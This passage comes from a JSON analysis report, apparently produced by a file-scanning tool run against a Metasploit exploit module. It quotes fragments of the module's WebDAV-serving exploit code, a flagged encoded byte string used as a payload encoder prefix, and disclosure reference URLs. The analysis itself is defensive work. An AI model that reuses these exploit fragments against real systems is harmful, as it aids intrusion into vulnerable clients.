            "\t\tresp.body = body",
            "\t\tresp['Content-Type'] = 'text/xml'",
            "\t\tcli.send_response(resp)",
            "\tend",
            "\t# Make sure we're on the right port/path to support WebDAV",
            "\tdef exploit",
            "\t\tif datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'",
            "\t\t\traise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'",
            "\t\tend",
            "\t\tsuper",
            "\tend"
        ],
        "file": {},
        "fuzzing": {
            "Possible encoded string": [
                "\t\t\t\t\t'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\""
            ]
        },
        "ip": [],
        "url": [
            "http://www.reversemode.com/index.php?option=com_content&task=view&id=67&Itemid=1",
            "http://metasploit.com/framework/",
            "http://archives.neohapsis.com/archives/fulldisclosure/2010-04/0122.html",
            "http://apache.org/dav/props/"
        ]
    },
    "time": "0:00:00.390815",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
